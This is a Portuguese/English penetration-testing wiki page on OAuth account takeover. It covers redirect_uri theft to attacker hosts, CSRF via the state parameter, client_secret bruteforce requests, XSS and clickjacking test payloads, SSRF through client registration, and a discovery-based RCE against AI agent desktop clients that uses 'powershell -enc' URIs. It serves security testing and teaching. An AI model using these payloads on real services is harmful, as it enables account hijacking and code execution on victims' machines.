# OAuth para sequestro de conta

{{#include ../banners/hacktricks-training.md}}

## Informações Básicas <a href="#d4a8" id="d4a8"></a>

OAuth oferece várias versões, com informações básicas disponíveis em [OAuth 2.0 documentation](https://oauth.net/2/). Esta discussão foca principalmente no amplamente usado [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), fornecendo um **framework de autorização que permite a uma aplicação acessar ou executar ações na conta de um usuário em outra aplicação** (the authorization server).

Considere um site hipotético _**https://example.com**_, projetado para **exibir todas as suas publicações em redes sociais**, incluindo as privadas. Para isso, é usado OAuth 2.0. _https://example.com_ solicitará sua permissão para **acessar suas publicações em redes sociais**. Consequentemente, uma tela de consentimento aparecerá em _https://socialmedia.com_, descrevendo as **permissões solicitadas e o desenvolvedor que está fazendo a solicitação**. Após sua autorização, _https://example.com_ obtém a capacidade de **acessar suas publicações em seu nome**.

É essencial compreender os seguintes componentes dentro do framework OAuth 2.0:

- **resource owner**: Você, como o **usuário/entidade**, autoriza o acesso ao seu recurso, por exemplo, as publicações da sua conta em redes sociais.
- **resource server**: O **servidor que gerencia requisições autenticadas** depois que a aplicação obteve um `access token` em nome do `resource owner`, por exemplo, **https://socialmedia.com**.
- **client application**: A **aplicação que busca autorização** do `resource owner`, como **https://example.com**.
- **authorization server**: O **servidor que emite `access tokens`** para a `client application` após a autenticação bem-sucedida do `resource owner` e a obtenção da autorização, por exemplo, **https://socialmedia.com**.
- **client_id**: Um identificador público e único para a aplicação.
- **client_secret:** Uma chave confidencial, conhecida apenas pela aplicação e pelo authorization server, usada para gerar `access_tokens`.
- **response_type**: Um valor que especifica **o tipo de token requisitado**, como `code`.
- **scope**: O **nível de acesso** que a `client application` está solicitando ao `resource owner`.
- **redirect_uri**: A **URL para a qual o usuário é redirecionado após a autorização**. Tipicamente deve coincidir com a URL de redirect pré-registrada.
- **state**: Um parâmetro para **manter dados durante o redirecionamento do usuário para e a partir do authorization server**. Sua unicidade é crítica para funcionar como um **mecanismo de proteção contra CSRF**.
- **grant_type**: Um parâmetro que indica **o tipo de grant e o tipo de token que será retornado**.
- **code**: O código de autorização vindo do `authorization server`, usado em conjunto com `client_id` e `client_secret` pela client application para adquirir um `access_token`.
- **access_token**: O **token que a client application usa para requisições de API** em nome do `resource owner`.
- **refresh_token**: Permite à aplicação **obter um novo `access_token` sem solicitar novamente ao usuário**.

### Fluxo

O **fluxo real do OAuth** procede da seguinte forma:

1. Você navega até [https://example.com](https://example.com) e seleciona o botão “Integrate with Social Media”.
2. O site então envia uma requisição para [https://socialmedia.com](https://socialmedia.com) pedindo sua autorização para permitir que a aplicação de https://example.com acesse suas publicações. A requisição é estruturada como:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Você é então apresentado a uma página de consentimento.
4. Após sua aprovação, Social Media envia uma resposta para o `redirect_uri` com os parâmetros `code` e `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com utiliza este `code`, juntamente com seu `client_id` e `client_secret`, para fazer uma requisição do lado do servidor para obter um `access_token` em seu nome, permitindo o acesso às permissões às quais você consentiu:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Finalmente, o processo conclui quando https://example.com usa seu `access_token` para fazer uma chamada de API à rede social para acessar

## Vulnerabilities <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), o authorization server deve redirecionar o browser apenas para **redirect URIs exatas e pré-registradas**. Qualquer fraqueza aqui permite que um atacante envie a vítima por uma URL de autorização maliciosa para que o IdP entregue o `code` (e o `state`) da vítima diretamente a um endpoint controlado pelo atacante, que então pode resgatar o código e colher tokens.

Fluxo de ataque típico:

1. Crie `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` e envie para a vítima.
2. A vítima se autentica e aprova os scopes.
3. O IdP redireciona para `attacker.tld/callback?code=<victim-code>&state=...`, onde o atacante registra a requisição e imediatamente troca o code.

Bugs comuns de validação a testar:

- **No validation** – qualquer URL absoluta é aceita, resultando em furto instantâneo do code.
- **Weak substring/regex checks on the host** – contorne com lookalikes como `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, ou `match.com@evil.com`.
- **IDN homograph mismatches** – a validação ocorre na forma punycode (`xn--`), mas o browser redireciona para o domínio Unicode controlado pelo atacante.
- **Arbitrary paths on an allowed host** – apontar o `redirect_uri` para `/openredirect?next=https://attacker.tld` ou qualquer endpoint de XSS/conteúdo de usuário vaza o code seja por redirecionamentos encadeados, Referer headers, ou JavaScript injetado.
- **Directory constraints without normalization** – padrões como `/oauth/*` podem ser contornados com `/oauth/../anything`.
- **Wildcard subdomains** – aceitar `*.example.com` significa que qualquer takeover (dangling DNS, S3 bucket, etc.) imediatamente fornece um callback válido.
- **Non-HTTPS callbacks** – permitir URIs `http://` dá a atacantes de rede (Wi-Fi, proxy corporativo) a oportunidade de capturar o code em trânsito.

Revise também parâmetros auxiliares do tipo redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) e o OpenID discovery document (`/.well-known/openid-configuration`) para endpoints adicionais que possam herdar os mesmos bugs de validação.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Como mencionado neste bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), pode ser possível que a redirect **URL esteja sendo refletida na resposta** do servidor após o usuário se autenticar, estando **vulnerável a XSS**. Payload possível para testar:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Improper handling of state parameter <a href="#bda5" id="bda5"></a>

O parâmetro `state` é o CSRF token do Authorization Code flow: o client deve gerar um **valor criptograficamente aleatório por instância de navegador**, persistí‑lo em algum lugar que apenas esse navegador possa ler (cookie, local storage, etc.), enviá‑lo na requisição de autorização e rejeitar qualquer resposta que não retorne o mesmo valor. Sempre que o valor for estático, previsível, opcional ou não vinculado à sessão do usuário, o atacante pode terminar seu próprio fluxo OAuth, capturar a requisição final `?code=` (sem enviá‑la) e depois forçar um navegador de vítima a reproduzir essa requisição para que a conta da vítima fique ligada ao perfil do provedor de identidade do atacante.

O padrão de replay é sempre o mesmo:

1. O atacante autentica contra o IdP com sua conta e intercepta o último redirect contendo `code` (e qualquer `state`).
2. Ele descarta essa requisição, guarda a URL, e mais tarde abusa de qualquer primitiva CSRF (link, iframe, formulário auto-submetido) para obrigar o navegador da vítima a carregá‑la.
3. Se o client não aplica `state`, a aplicação consome o resultado de autorização do atacante e conecta o atacante na conta da vítima no app.

Checklist prática para tratamento de `state` durante testes:

- **Missing `state` entirely** – se o parâmetro nunca aparece, todo o login é vulnerável a CSRF.
- **`state` not required** – remova-o da requisição inicial; se o IdP ainda emitir codes que o client aceita, a defesa é opt‑in.
- **Returned `state` not validated** – manipule o valor na resposta (Burp, MITM proxy). Aceitar valores incompatíveis significa que o token armazenado nunca é comparado.
- **Predictable or purely data-driven `state`** – muitas apps colocam caminhos de redirect ou blobs JSON dentro de `state` sem misturar aleatoriedade, permitindo que atacantes adivinhem valores válidos e reproduzam fluxos. Sempre prefixe/sufixe com entropia forte antes de codificar dados.
- **`state` fixation** – se o app permite que usuários forneçam o valor `state` (ex.: via URLs de autorização forjadas) e o reutiliza ao longo do fluxo, um atacante pode travar um valor conhecido e reutilizá‑lo entre vítimas.

PKCE pode complementar `state` (especialmente para public clients) vinculando o authorization code a um code verifier, mas web clients ainda devem rastrear `state` para prevenir bugs de CSRF/ligação-de-conta entre usuários.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Atacantes podem criar proativamente uma conta usando o email da vítima. Se a vítima mais tarde usar um serviço de terceiro para login, a aplicação pode inadvertidamente vincular essa conta de terceiro à conta pré‑criada do atacante, levando a acesso não autorizado.
2. **Exploiting Lax OAuth Email Verification**: Atacantes podem explorar serviços OAuth que não verificam emails registrando‑se com seu serviço e então alterando o email da conta para o da vítima. Esse método apresenta risco similar de acesso não autorizado, análogo ao primeiro cenário mas através de outro vetor.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

O `client_id` é intencionalmente público, mas o **`client_secret` nunca deve ser recuperável por usuários finais**. Deployments do Authorization Code que embutem o secret em **mobile APKs, desktop clients, ou single-page apps** entregam efetivamente essa credencial a qualquer um que possa baixar o pacote. Sempre inspecione public clients por:

- Desempacotar o APK/IPA, instalador desktop ou Electron app e grepar por `client_secret`, blobs Base64 que decodificam para JSON, ou endpoints OAuth hard-coded.
- Revisar arquivos de configuração empacotados (plist, JSON, XML) ou strings decompiladas em busca de credenciais de client.

Uma vez que o atacante extrai o secret, ele só precisa roubar qualquer `code` de autorização da vítima (via um `redirect_uri` fraco, logs, etc.) para chamar `/token` de forma independente e fabricar access/refresh tokens sem envolver o app legítimo. Trate public/native clients como **incapazes de manter secrets** — eles devem confiar em PKCE (RFC 7636) para provar posse de um code verifier por instância em vez de um secret estático. Durante testes, confirme se PKCE é obrigatório e se o backend realmente rejeita trocas de token que omitem ou o `client_secret` **ou** um `code_verifier` válido.

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location artifacts leaking Code + State

Once the client has the **code and state**, if they surface in **`location.href`** or **`document.referrer`** and are forwarded to third parties, they leak. Two recurring patterns:

- **Classic Referer leak**: after the OAuth redirect, any navigation that keeps `?code=&state=` in the URL will push them into the **Referer** header sent to CDNs/analytics/ads.
- **Telemetry/analytics confused deputy**: some SDKs (pixels/JS loggers) react to `postMessage` events and then **send the current `location.href`/`referrer` to backend APIs using a token supplied in the message**. If you can inject your own token into that flow (e.g., via an attacker-controlled postMessage relay), you can later read the SDK’s API request history/logs and recover the victim’s OAuth artifacts embedded in those requests.

### Access Token Stored in Browser History

The core guarantee of the Authorization Code grant is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise. Always check for:

- **Tokens in URLs** – if `access_token` appears in the query/fragment, it lands in browser history, server logs, analytics, and Referer headers sent to third parties.
- **Tokens transiting untrusted middleboxes** – returning tokens over HTTP or through debugging/corporate proxies lets network observers capture them directly.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs expose tokens to every script on the origin (including XSS payloads or malicious extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retain tokens long after logout on shared devices and are script-accessible.

Any of these findings usually upgrades otherwise “low” bugs (like a CSP bypass or DOM XSS) into full API takeover because the attacker can simply read and replay the leaked bearer token.

### Everlasting Authorization Code

Authorization codes must be **short-lived, single-use, and replay-aware**. When assessing a flow, capture a `code` and:

- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Try redeeming the code after 5–10 minutes; if it still works, the exposure window for any leaked code is excessive.
- **Test sequential reuse** – send the same `code` twice. If the second request yields another token, attackers can clone sessions indefinitely.
- **Test concurrent redemption/race conditions** – fire two token requests in parallel (Burp intruder, turbo intruder). Weak issuers sometimes grant both.
- **Observe replay handling** – a reuse attempt should not only fail but also revoke any tokens already minted from that code. Otherwise, a detected replay leaves the attacker’s first token active.

Combining a replay-friendly code with any `redirect_uri` or logging bug allows persistent account access even after the victim completes the legitimate login.

### Authorization/Refresh Token not bound to client

If you can get the **authorization code** and **redeem it for a different client/app**, you can takeover other accounts. Test for weak binding by:

- Capturing a `code` for **app A** and sending it to **app B’s token endpoint**; if you still receive a token, audience binding is broken.
- Trying first-party token minting endpoints that should be restricted to their own client IDs; if they accept arbitrary `state`/`app_id` while only validating the code, you effectively perform an **authorization-code swap** to mint higher-privileged first-party tokens.
- Checking whether client binding ignores nonce/redirect URI mismatches. If an error page still loads SDKs that log `location.href`, combine with Referer/telemetry leaks to steal codes and redeem them elsewhere.

Any endpoint that exchanges `code` → token **must** verify the issuing client, redirect URI, and nonce; otherwise, a stolen code from any app can be upgraded to a first-party access token.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Para informações mais detalhadas sobre como abusar do AWS Cognito veja [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusando de tokens de outras Apps <a href="#bda5" id="bda5"></a>

Como [**mencionado neste writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), fluxos OAuth que esperam receber o **token** (e não um code) podem ser vulneráveis se não verificarem que o token pertence ao app.

Isto porque um **atacante** poderia criar uma **application supporting OAuth and login with Facebook** (por exemplo) na sua própria aplicação. Então, uma vez que uma vítima faz login com Facebook na **aplicação do atacante**, o atacante poderia obter o **OAuth token do usuário dado à sua aplicação, e usá-lo para fazer login na aplicação OAuth da vítima usando o token do usuário da vítima**.

> [!CAUTION]
> Portanto, se o atacante conseguir que o usuário acesse a sua própria aplicação OAuth, ele será capaz de assumir a conta da vítima em aplicações que estão esperando um token e não verificam se o token foi concedido ao app ID delas.

### Dois links & cookie <a href="#bda5" id="bda5"></a>

De acordo com [**este writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), era possível fazer a vítima abrir uma página com um **returnUrl** apontando para o host do atacante. Essa informação seria **armazenada em um cookie (RU)** e em um **passo posterior** o **prompt** iria **perguntar** ao **usuário** se ele quer dar acesso àquele host do atacante.

Para contornar esse prompt, era possível abrir uma aba para iniciar o **Oauth flow** que definiria esse cookie RU usando o **returnUrl**, fechar a aba antes do prompt ser exibido, e abrir uma nova aba sem esse valor. Assim, o **prompt não informará sobre o host do atacante**, mas o cookie estaria definido para ele, então o **token será enviado para o host do atacante** na redireção.

### Bypass de interação do prompt <a href="#bda5" id="bda5"></a>

Como explicado em [**este vídeo**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), algumas implementações OAuth permitem indicar o parâmetro GET **`prompt`** como None (**`&prompt=none`**) para **impedir que os usuários sejam solicitados a confirmar** o acesso dado em um prompt na web se eles já estiverem logados na plataforma.

### response_mode

Como [**explicado neste vídeo**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), pode ser possível indicar o parâmetro **`response_mode`** para indicar onde você quer que o code seja fornecido na URL final:

- `response_mode=query` -> O code é fornecido dentro de um parâmetro GET: `?code=2397rf3gu93f`
- `response_mode=fragment` -> O code é fornecido dentro do fragmento da URL `#code=2397rf3gu93f`
- `response_mode=form_post` -> O code é fornecido dentro de um form POST com um input chamado `code` e o valor
- `response_mode=web_message` -> O code é enviado em um post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking em diálogos de consentimento OAuth

OAuth consent/login dialogs são alvos ideais para clickjacking: se puderem ser emoldurados, um atacante pode sobrepor gráficos customizados, esconder os botões reais e enganar usuários para aprovar scopes perigosos ou vincular contas. Crie PoCs que:

1. Carreguem a IdP authorization URL dentro de um `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Usem truques de posicionamento absoluto/opacity para alinhar botões falsos com os controles ocultos **Allow**/**Approve**.
3. Opcionalmente pré-preencham parâmetros (scopes, redirect URI) para que a aprovação roubada beneficie imediatamente o atacante.

Durante os testes verifique se as páginas do IdP emitem `X-Frame-Options: DENY/SAMEORIGIN` ou uma `Content-Security-Policy: frame-ancestors 'none'` restritiva. Se nenhum estiver presente, demonstre o risco com ferramentas como [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) e registre o quão facilmente uma vítima autoriza o app do atacante. Para ideias adicionais de payloads veja [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

De acordo com [**este post do blog**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), este é um fluxo OAuth que permite fazer login no OAuth via **username** e **password**. Se durante esse fluxo simples um **token** com acesso a todas as ações que o usuário pode realizar for retornado, então é possível burlar 2FA usando esse token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Este [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) comenta como foi possível abusar de um **open redirect** para o valor do **referrer** para abusar OAuth e gerar um ATO. O ataque foi:

1. A vítima acessa a página web do atacante
2. A vítima abre o link malicioso e um opener inicia o Google OAuth flow com `response_type=id_token,code&prompt=none` como parâmetros adicionais usando como **referrer o website do atacante**.
3. No opener, após o provedor autorizar a vítima, ele a envia de volta para o valor do parâmetro `redirect_uri` (site da vítima) com um código 30X que ainda mantém o website do atacante no referer.
4. O website da vítima **aciona o open redirect com base no referrer** redirecionando o usuário vítima para o website do atacante; como o **`respose_type`** era **`id_token,code`**, o code será enviado de volta ao atacante no **fragment** da URL permitindo que ele tome conta da conta do usuário via Google no site da vítima.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **Para mais detalhes desta técnica.**

Dynamic Client Registration em OAuth serve como um vetor menos óbvio mas crítico para vulnerabilidades de segurança, especificamente para ataques de **Server-Side Request Forgery (SSRF)**. Esse endpoint permite que servidores OAuth recebam detalhes sobre aplicações cliente, incluindo URLs sensíveis que podem ser exploradas.

Pontos-chave:

- **Dynamic Client Registration** é frequentemente mapeado para `/register` e aceita detalhes como `client_name`, `client_secret`, `redirect_uris`, e URLs para logos ou JSON Web Key Sets (JWKs) via requisições POST.
- Essa funcionalidade segue especificações definidas em **RFC7591** e **OpenID Connect Registration 1.0**, que incluem parâmetros potencialmente vulneráveis a SSRF.
- O processo de registro pode, inadvertidamente, expor servidores a SSRF de várias maneiras:
  - **`logo_uri`**: Uma URL para o logo da aplicação cliente que pode ser buscada pelo servidor, disparando SSRF ou levando a XSS se a URL for mal tratada.
  - **`jwks_uri`**: A URL para o documento JWK do cliente, que se for maliciosamente construída, pode fazer com que o servidor faça requisições de saída para um servidor controlado pelo atacante.
  - **`sector_identifier_uri`**: Refere um array JSON de `redirect_uris`, que o servidor pode buscar, criando uma oportunidade de SSRF.
  - **`request_uris`**: Lista URIs de request permitidas para o cliente, que podem ser exploradas se o servidor buscar essas URIs no início do processo de autorização.

Estratégia de Exploração:

- SSRF pode ser desencadeado registrando um novo cliente com URLs maliciosas em parâmetros como `logo_uri`, `jwks_uri` ou `sector_identifier_uri`.
- Enquanto a exploração direta via `request_uris` pode ser mitigada por controles de whitelist, fornecer um `request_uri` pré-registrado e controlado pelo atacante pode facilitar SSRF durante a fase de autorização.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

A pesquisa sobre [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impactando clientes `mcp-remote` como Claude Desktop, Cursor ou Windsurf) mostra como **dynamic OAuth discovery se torna um primitivo de RCE** sempre que o cliente encaminha metadados do IdP diretamente para o sistema operacional. O servidor MCP remoto retorna um `authorization_endpoint` controlado pelo atacante durante a troca de discovery (`/.well-known/openid-configuration` ou qualquer metadata RPC). `mcp-remote ≤0.1.15` então chamaria o manipulador de URL do sistema (`start`, `open`, `xdg-open`, etc.) com a string recebida, de modo que qualquer scheme/path suportado pelo SO era executado localmente.

Attack workflow

1. Aponte o agente desktop para um servidor MCP/OAuth hostil (`npx mcp-remote https://evil`). O agente recebe `401` mais metadata.
2. O servidor responde com JSON como:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. The client launches the OS handler for the supplied URI. Windows accepts payloads like `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux accept `file:///Applications/Calculator.app/...` or even custom schemes such as `cmd://bash -lc '<payload>'` if registered.
4. Because this happens before any user interaction, **merely configuring the client to talk to the attacker server yields code execution**.

**Como testar**

- Aponte para qualquer desktop/agent com suporte a OAuth que realiza discovery via HTTP(S) e abre endpoints retornados localmente (Electron apps, CLI helpers, thick clients).
- Intercepte ou hospede a resposta de discovery e substitua `authorization_endpoint`, `device_authorization_endpoint`, ou campos similares por `file://`, `cmd://`, caminhos UNC, ou outros esquemas perigosos.
- Observe se o cliente valida o scheme/host. A falta de validação resulta em execução imediata no contexto do usuário e prova a vulnerabilidade.
- Repita com diferentes schemes para mapear toda a superfície de ataque (por exemplo, `ms-excel:`, `data:text/html,`, custom protocol handlers) e demonstrar alcance cross-platform.

## OAuth providers Race Conditions

Se a plataforma que você está testando é um OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, the `sub` field uniquely identifies a user, but its format varies by Authorization Server. To standardize user identification, some clients use emails or user handles. However, this is risky because:

- Alguns Authorization Servers não garantem que essas propriedades (como email) permaneçam imutáveis.
- Em certas implementações — como **"Login with Microsoft"** — o client depende do campo email, que é **controlado pelo usuário no Entra ID** e não é verificado.
- Um atacante pode explorar isso criando sua própria organização Azure AD (por exemplo, doyensectestorg) e usá-la para realizar um Microsoft login.
- Embora o Object ID (armazenado em `sub`) seja imutável e seguro, a dependência de um campo de email mutável pode permitir takeover de conta (por exemplo, sequestrando uma conta como victim@gmail.com).

## Client Confusion Attack

Em um **Client Confusion Attack**, uma aplicação que usa o OAuth Implicit Flow não verifica que o access token final foi especificamente gerado para seu próprio Client ID. Um atacante monta um site público que usa o OAuth Implicit Flow do Google, enganando milhares de usuários a fazer login e assim colecionando access tokens destinados ao site do atacante. Se esses usuários também tiverem contas em outro site vulnerável que não valida o Client ID do token, o atacante pode reutilizar os tokens coletados para se passar pelas vítimas e takeover de suas contas.

## Scope Upgrade Attack

O tipo **Authorization Code Grant** envolve comunicação segura server-to-server para transmitir dados do usuário. No entanto, se o **Authorization Server** confiar implicitamente em um parâmetro scope na Access Token Request (um parâmetro não definido no RFC), uma aplicação maliciosa poderia elevar privilégios de um authorization code requisitando um scope maior. Depois que o **Access Token** é gerado, o **Resource Server** deve verificá-lo: para tokens JWT, isso envolve checar a assinatura do JWT e extrair dados como `client_id` e `scope`, enquanto para tokens em forma de strings aleatórias, o servidor deve consultar o Authorization Server para recuperar os detalhes do token.

## Redirect Scheme Hijacking

Em implementações mobile de OAuth, apps usam **custom URI schemes** para receber redirecionamentos com Authorization Codes. Entretanto, como múltiplos apps podem registrar o mesmo scheme em um dispositivo, a suposição de que apenas o cliente legítimo controla o redirect URI é violada. No Android, por exemplo, um Intent URI como `com.example.app://` oauth é capturado com base no scheme e em filtros opcionais definidos no intent-filter de um app. Como a resolução de intents do Android pode ser ampla — especialmente se apenas o scheme for especificado — um atacante pode registrar um app malicioso com um intent filter cuidadosamente elaborado para hijack do authorization code. Isso pode **permitir um account takeover** seja via interação do usuário (quando múltiplos apps são elegíveis para handle do intent) ou via técnicas de bypass que exploram filtros excessivamente específicos, como detalhado pelo fluxo de avaliação da Ostorlab.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
